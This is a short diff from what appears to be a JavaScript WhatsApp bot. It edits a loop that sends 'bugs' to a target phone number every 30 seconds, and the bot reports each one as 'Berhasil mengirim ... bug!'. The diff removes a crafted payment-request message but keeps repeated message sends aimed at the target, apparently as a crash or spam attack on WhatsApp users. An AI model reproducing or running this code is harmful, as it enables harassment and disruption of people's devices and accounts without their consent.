@@ -193,8 +193,6 @@ reply('Loading...')
 function delay1Menit(i) { setTimeout(() => {
 reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
 semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: contactMessage })
-var requestPaymentMessage = generateWAMessageFromContent(`${dn}@s.whatsapp.net`, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "100","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61",}}}), { userJid: `${dn}@s.whatsapp.net`, quoted: stickerMessage})
-semar.relayMessage(`${dn}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 delay1Menit(++i)}, 30000)}
 delay1Menit(0)
 break
